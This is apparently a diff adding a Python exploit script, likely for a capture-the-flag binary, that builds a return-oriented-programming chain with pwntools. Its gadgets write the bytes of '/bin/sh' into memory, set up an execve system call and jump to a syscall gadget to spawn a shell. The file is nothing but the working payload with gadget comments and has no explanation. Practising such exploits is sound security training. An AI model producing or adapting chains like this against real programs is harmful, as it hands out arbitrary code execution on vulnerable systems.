@@ -1,0 +1,33 @@
+payload = p64(0x4017ca)
+#0x00000000004017ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x405ffb)+p64(0x44e1c9)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4017ca)
+# 0x00000000004017ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x436be1)+p64(0x44e1bf)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4017ca)
+# 0x00000000004017ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x6e69622f)+p64(0x44e0ad)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4017ca)
+# 0x00000000004017ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
+payload += p64(0x68662f)+p64(0x44e0b1)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x40125c)
+# 0x40125c: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x436be1)
+# 0x436be1: pop rsi ; retf
+payload += p64(0x44e1d1)+p32(0x435285)+p32(0x33)
+# 0x0000000000435285: pop rdx; std; jmp qword ptr [rsi - 0x45]; 
+payload += p64(0x3b)
+# 0x0000000000405ffb: xchg edx, eax; ret; 
+payload += p64(0x4017d3)
+# 0x00000000004017d3: pop rdi; ret; 
+payload += p64(0x44e070)+p64(0x436be1)
+# 0x436be1: pop rsi ; retf
+payload += p64(0x44e1c7)+p32(0x435285)+p32(0x33)
+# 0x0000000000435285: pop rdx; std; jmp qword ptr [rsi - 0x45]; 
+payload += p64(0x0)
+# 0x436be1: pop rsi ; retf
+payload += p64(0x0)+p32(0x41ada8)+p32(0x33)
+# 0x000000000041ada8: syscall; 
+payload += b''
